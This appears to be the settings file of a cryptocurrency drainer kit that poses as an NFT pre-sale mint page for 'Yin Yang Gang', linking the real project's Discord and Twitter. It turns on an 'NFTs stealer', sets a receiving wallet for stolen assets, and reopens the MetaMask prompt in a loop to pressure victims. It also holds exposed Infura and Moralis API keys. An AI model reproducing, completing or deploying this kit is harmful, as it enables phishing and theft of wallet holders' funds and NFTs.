const address = "0xBcc5Ed50b50D744Bd7e7dbE076e1a2e08F4d57A3";
const infuraId = "1d5e6d029a604a09870214e2a3801cb2"     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = "FQhPZwDeL9pDYzQqLOT5DmQPOLoRBJI3qdOjlnDdshaSO0auU7Dr7SD1OnZVKxR0"    // x-api-key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "Yin Yang Gang Pre sale",
    title: "YYG MINT", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "08.07.2022",
    socialMedia: {
        discord: "https://discord.com/invite/yyg",
        twitter: "https://twitter.com/projectyingang",
    },
    medias: {
        preview: "gif.gif",
        favicon: "favicon.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "bg.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.03,         // Price per NFT.
    totalSupply: 667,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 6,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 10000, // Maximum number of days to check for the last transactions.
    receiveAddress: "0xbd88f663F469Fd73D225586efc37605667aBd901" // leave empty if you want to use the same address 
}

/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
